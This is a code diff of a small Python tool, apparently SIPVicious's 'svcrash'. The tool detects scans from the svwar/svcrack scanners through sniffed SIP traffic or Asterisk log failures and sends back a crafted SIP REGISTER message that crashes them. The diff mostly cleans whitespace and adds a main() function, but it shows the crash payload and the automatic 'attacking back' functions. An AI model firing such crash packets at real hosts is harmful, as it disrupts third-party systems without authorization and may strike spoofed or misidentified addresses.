@@ -4,19 +4,19 @@
 __GPL__ = """
 
    Sipvicious crash exploits a bug in svwar/svcrack.py to stop unauthorized
-   scans from flooding the network. 
+   scans from flooding the network.
    Copyright (C) 2012  Sandro Gauci <sandro@enablesecurity.com>
 
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.
-   
+
    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
-   
+
    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
 """
@@ -74,7 +74,7 @@ def getArgs():
             parser.error("Could not read %s" % options.astlog)
     if (scapyversion == 0) or not (options.auto):
         try:
-            s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)    
+            s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
             s.bind(('0.0.0.0',5060))
         except socket.error:
             parser.error("You either need have port 5060 available or install scapy from http://www.secdev.org/projects/scapy/")
@@ -86,13 +86,13 @@ class asteriskreadlognsend:
         self.lastsent = 30
         self.matchcount = 0
         self.log = None
-        
-    def checkfile(self):        
+
+    def checkfile(self):
         if (self.log is None) or (self.origlogsize > os.path.getsize(self.logfn)):
-            self.log = open(self.logfn,'r')            
+            self.log = open(self.logfn,'r')
             self.origlogsize = os.path.getsize(self.logfn)
             self.log.seek(self.origlogsize)
-        
+
     def findfailures(self):
         self.checkfile()
         buff = self.log.readline()
@@ -100,17 +100,17 @@ class asteriskreadlognsend:
             time.sleep(1)
             return
         if time.time() - self.lastsent <= 2:
-            return        
+            return
         match = re.search("Registration from '(.*?)' failed for '(.*?)' - (No matching peer found|Wrong password)",buff)
-        if match:                        
+        if match:
             self.matchcount += 1
         if self.matchcount > 6:
             self.matchcount = 0
             return match.group(2)
         else:
             #time.sleep(1)
-            return 
-    
+            return
+
     def start(self):
         try:
             while 1:
@@ -123,7 +123,7 @@ class asteriskreadlognsend:
                             sendattack(ipaddr,i)
         except KeyboardInterrupt:
             return
-        
+
 
 class sniffnsend:
     def __init__(self,port=5060):
@@ -156,9 +156,9 @@ class sniffnsend:
                 if time.time() - self.mytimer[src] > 10:
                     #print "del %s:%s:%s" % (str(src),time.time(),self.mytimer[src])
                     del(self.mytimer[src])
-                
-    
-    def start(self):        
+
+
+    def start(self):
         try:
             sniff(prn=self.checknsend,filter="udp port %s" % self.port, store=0)
         except KeyboardInterrupt:
@@ -170,8 +170,8 @@ crashmsg+='"100"<sip:100@localhost>; tag=683a653a7901746865726501627965\r\nUs'
 crashmsg+='er-agent: Telkom Box 2.4\r\nTo: "100"<sip:100@localhost>\r\nCse'
 crashmsg+='q: 1 REGISTER\r\nCall-id: 469585712\r\nMax-forwards: 70\r\n\r\n'
 
-def sendattack(ipaddr,port):    
-    s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)    
+def sendattack(ipaddr,port):
+    s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
     s.bind(('0.0.0.0',5060))
     dst=ipaddr,port
     s.sendto(crashmsg,dst)
@@ -182,8 +182,8 @@ def sendattack2(ipaddr,port):
     packet = IP(dst=ipaddr)/UDP(sport=5060,dport=port)/crashmsg
     sys.stdout.write("Attacking back %s:%s\r\n" % (ipaddr,port))
     send(packet,verbose=0)
-    
-if __name__ == "__main__":
+
+def main():
     options,args = getArgs()
     if options.auto:
         sns = sniffnsend()
@@ -196,3 +196,6 @@ if __name__ == "__main__":
             sendattack(options.ipaddr,port)
     else:
         sendattack(options.ipaddr,options.port)
+
+if __name__ == "__main__":
+    main()
